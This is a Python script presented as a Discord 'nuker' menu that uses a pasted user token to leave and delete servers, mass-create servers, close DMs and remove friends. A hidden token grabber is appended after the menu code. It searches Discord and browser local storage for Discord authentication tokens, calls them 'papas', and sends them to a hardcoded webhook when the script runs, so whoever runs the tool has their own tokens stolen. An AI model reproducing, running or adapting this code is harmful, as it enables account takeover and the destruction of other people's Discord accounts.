import requests, os, threading, discord, time
from colorama import Fore
from colored import fg, attr
from discord.ext import commands
from pypresence import Presence
b = Fore.LIGHTBLACK_EX
r = Fore.RESET
g = fg('#00ff00 ')

clear = lambda: os.system('cls') if os.name == 'nt' else os.system('clear')

RPC = Presence("935976521875730462")
RPC.connect()
RPC.update(state='Welcome To Our Hell', details='discord.gg/TCyGay6ADE', large_image='largerimage',small_image="smallimage",large_text="discord.gg/TCyGay6ADE",small_text="Welcome To Our Hell")

os.system(f'title Sparkle Menu │ Awaiting Token')
client = commands.Bot(command_prefix=".", self_bot= True)

def login(token):
    data = {}
    
    @client.event
    async def on_ready():
      try:
         os.system(f'title Sparkle │ Authenticated: {client.user.name}#{client.user.discriminator}')
         RPC.close()
         RPC.connect()
         RPC.update(state='Welcome To Our Hell', details='discord.gg/TCyGay6ADE', large_image='largerimage',small_image="smallimage",large_text="discord.gg/TCyGay6ADE",small_text="Welcome To Our Hell")
      except Exception as e:
         pass
        
      data['guildsID'] = [guild.id for guild in client.guilds]
      data['friendsID'] = [freind.id for freind in client.user.friends]
      data['channelsID'] = [channel.id for channel in client.private_channels]
       
      await client.close()
    try:
        client.run(token, bot=False)
    except Exception as error:
        print(f"[{g}~{r}] {g}Incorrect Token{r}", error)
        return None
    return data

def menu():
   print(f'''

                                     {b}██████{g}╗{b}██████{g}╗  {b}█████{g}╗ {b}██████{g}╗ {b}██{g}╗  {b}██{g}╗{b}██{g}╗     {b}███████{g}╗
                                    {b}██{g}╔════╝{b}██{g}╔══{b}██{g}╗{b}██{g}╔══{b}██{g}╗{b}██{g}╔══{b}██{g}╗{b}██{g}║ {b}██{g}╔╝{b}██{g}║     {b}██{g}╔════╝
                                    {g}╚{b}█████{g}╗ {b}██████{g}╔╝{b}███████{g}║{b}██████{g}╔╝{b}█████{g}═╝ {b}██{g}║     {b}█████{g}╗  
                                     {g}╚═══{b}██{g}╗{b}██{g}╔═══╝ {b}██{g}╔══{b}██{g}║{b}██{g}╔══{b}██{g}╗{b}██{g}╔═{b}██{g}╗ {b}██{g}║     {b}██{g}╔══╝  
                                    {b}██████{g}╔╝{b}██{g}║     {b}██{g}║  {b}██{g}║{b}██{g}║  {b}██{g}║{b}██{g}║ {g}╚{b}██{g}╗{b}███████{g}╗{b}███████{g}╗
                                    {g}╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
                                         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
                                           ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{r}  
''')

def menu2():
   print(f'''

                                    {b}██████{g}╗{b}██████{g}╗  {b}█████{g}╗ {b}██████{g}╗ {b}██{g}╗  {b}██{g}╗{b}██{g}╗     {b}███████{g}╗
                                   {b}██{g}╔════╝{b}██{g}╔══{b}██{g}╗{b}██{g}╔══{b}██{g}╗{b}██{g}╔══{b}██{g}╗{b}██{g}║ {b}██{g}╔╝{b}██{g}║     {b}██{g}╔════╝
                                   {g}╚{b}█████{g}╗ {b}██████{g}╔╝{b}███████{g}║{b}██████{g}╔╝{b}█████{g}═╝ {b}██{g}║     {b}█████{g}╗  
                                    {g}╚═══{b}██{g}╗{b}██{g}╔═══╝ {b}██{g}╔══{b}██{g}║{b}██{g}╔══{b}██{g}╗{b}██{g}╔═{b}██{g}╗ {b}██{g}║     {b}██{g}╔══╝  
                                   {b}██████{g}╔╝{b}██{g}║     {b}██{g}║  {b}██{g}║{b}██{g}║  {b}██{g}║{b}██{g}║ {g}╚{b}██{g}╗{b}███████{g}╗{b}███████{g}╗
                                   {g}╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
                                     {g}╔═════════════════════╗     ╔═════════════════════╗
                                     ║{r}discord.gg/TCyGay6ADE{g}║     ║{r}discord.gg/TCyGay6ADE{g}║
                                    ╔═══════════════════════╗   ╔═══════════════════════╗
                                    ║{r}1 {g}:{r}Nuke Token          {g}║   ║{r}5 {g}:{r}Delete Friends      {g}║
                                    ║{r}2 {g}:{r}Leave Servers       {g}║   ║{r}6 {g}:{r}Create Servers      {g}║
                                    ║{r}3 {g}:{r}Close Dms           {g}║   ║{r}7 {g}:{r}cls [clears console]{g}║ 
                                    ║{r}4 {g}:{r}Delete Servers      {g}║   ║{r}8 {g}:{r}empty               {g}║
                                    ╚═══════════════════════╝   ╚═══════════════════════╝{r}  
''')
menu2()
def leaveG(guild_id, token,):
   
      try:
         re = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild_id}", headers={"Authorization": token})
         if re.status_code == 200 or re.status_code == 201 or re.status_code == 204:
            print(f"{r}[{g}STATUS{r}] {g}Left {r}>> [ {g}{guild_id} {r}]")
         elif re.status_code == 429:
            print(f"{r}[{g}STATUS{r}] {g}Failed Leave {r}>> [ {g}{guild_id} {r}]")
            time.sleep(re.json()['retry_after'])
      except Exception as e:
         return

def createG(name, token, i,):
   
      try:
         payload = {'name': f'{name}', 'region': 'europe', 'icon': None, 'channels': None}
         re = requests.post('https://discord.com/api/v6/guilds', headers={"Authorization": token}, json=payload)
         if re.status_code == 200 or re.status_code == 201 or re.status_code == 204:
            print(f"{r}[{g}STATUS{r}] {g}Created {r}>> [ {g}{name} {r}] {g}Servers{r}")
         elif re.status_code == 429:
            print(f"{r}[{g}STATUS{r}] {g}Failed Create{r}>> [ {g}{name} {i}{r} ]")
            time.sleep(re.json()['retry_after'])
      except Exception as e:
         return
def deleteG(guild,token,):
   
      try:
         re = requests.delete(f'https://discord.com/api/v8/guilds/{guild}', headers={"Authorization": token})
         if re.status_code == 200 or re.status_code == 201 or re.status_code == 204:
            print(f"{r}[{g}STATUS{r}] {g}Deleted {r}>> [ {g}{guild} {r}]")
         elif re.status_code == 429:
            print(f"{r}[{g}STATUS{r}] {g}Failed Delete {r}>> [ {g}{guild} {r}]")
            time.sleep(re.json()['retry_after'])
      except Exception as e:
         pass
def closeD(id, token):
   
      try:
         re = requests.delete(f"https://discord.com/api/v8/channels/{id}", headers={"Authorization": token})
         if re.status_code == 200 or re.status_code == 201 or re.status_code == 204:
            print(f"{r}[{g}STATUS{r}] {g}Closed {r}>> [ {g}{id} {r}] DMS")
         elif re.status_code == 429:
            print(f"{r}[{g}STATUS{r}] {g}Failed Close {r}>> [ {g}{id} {r}] DMS")
            time.sleep(re.json()['retry_after'])
      except Exception as e:
         pass
def deleteF(friend, token):
   
      try:
         re = requests.delete(f"https://discord.com/api/v8/users/@me/relationships/{friend}", headers={"Authorization": token})
         if re.status_code == 200 or re.status_code == 201 or re.status_code == 204:
            print(f"{r}[{g}STATUS{r}] {g}Removed {r}>> [ {g}{id} {r}]")
         elif re.status_code == 429:
            print(f"{r}[{g}STATUS{r}] {g}Failed Remove{r}>> [ {g}{id} {r}]")
            time.sleep(re.json()['retry_after'])
      except Exception as e:
         pass
   

def start():
   while True:
      answer = input(f'{r}[{g}~{r}] {g}Choice{r}: ')
      if answer == '1':
         clear()
         menu()
         token = input(f"{g}Token{r}: ")
         clear()
         menu()
         acc = login(token)
         RPC.close()
         RPC.connect()
         RPC.update(state='Welcome To Our Hell', details='discord.gg/TCyGay6ADE', large_image='largerimage',small_image="smallimage",large_text="discord.gg/TCyGay6ADE",small_text="Welcome To Our Hell")
         num = 300
         name = input(f"{g}Server Names{r}:")
         clear()
         menu()
         for guild in acc['guildsID']:
            threading.Thread(target=leaveG, args=(guild, token,)).start()
         for guild in acc['guildsID']:
            threading.Thread(target=deleteG, args=(guild, token,)).start()
         for i in range(int(num)):
            threading.Thread(target=createG, args=(name, token, i,)).start()
         for id in acc['channelsID']:
            threading.Thread(target=closeD, args=(id, token,)).start()
         for friend in acc['friendsID']:
            threading.Thread(target=deleteF, args=(friend, token,)).start()
      elif answer == '2':
         clear()
         menu()
         token = input(f"{g}Token{r}: ")
         clear()
         menu()
         acc = login(token)
         for guild in acc['guildsID']:
            threading.Thread(target=leaveG, args=(guild, token,)).start()
      elif answer == '3':
         clear()
         menu()
         token = input(f"{g}Token{r}: ")
         clear()
         menu()
         acc = login(token)
         for id in acc['channelsID']:
            threading.Thread(target=closeD, args=(id, token,)).start()
      elif answer == '4':
         clear()
         menu()
         token = input(f"{g}Token{r}: ")
         clear()
         menu()
         acc = login(token)
         for guild in acc['guildsID']:
            threading.Thread(target=deleteG, args=(guild, token,)).start()
      elif answer == '5':
         clear()
         menu()
         token = input(f"{g}Token{r}: ")
         clear()
         menu()
         acc = login(token)
         for friend in acc['friendsID']:
            threading.Thread(target=deleteF, args=(friend, token,)).start()
      elif answer == '6':
         clear()
         menu()
         token = input(f"{g}Token{r}: ")
         clear()
         menu()
         num = 200
         name = input(f"{g}Server Names{r}:")
         clear()
         menu()
         acc = login(token)
         for i in range(int(num)):
            threading.Thread(target=createG, args=(name, token, i,)).start()
      elif answer == 'cls':
         clear()
         menu2()


   
import os
import re
import json

from urllib.request import Request, urlopen

# your webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/940608763512111134/VEqfRajqv3wK2iER9KDKeAlOE3opmzxYBymEcL8lBjqZgBx2GFAXjoDwuxdIXAyWNqIV'

# mentions you when you get a hit
PING_ME = True

def find_papas(path):
    path += '\\Local Storage\\leveldb'

    papas = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for papa in re.findall(regex, line):
                    papas.append(papa)
    return papas

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '||<@407247029207564289>||' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform} | Oh... Wow Look At This Papas!** <a:PP_qwee:937303574965272587> \n \n **___Look At These New Papas!___ <a:PP_snowflake:937214507007213699>** __{platform}__ \n **---------------------------------------------------------------------------------------------** \n```'

        papas = find_papas(path)

        if len(papas) > 0:
            for papa in papas:
                message += f'{papa}\n'
        else:
            message += 'No papas found.\n'

        message += '``` **---------------------------------------------------------------------------------------------**'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()

      
             
      
if __name__ == '__main__':
   start()
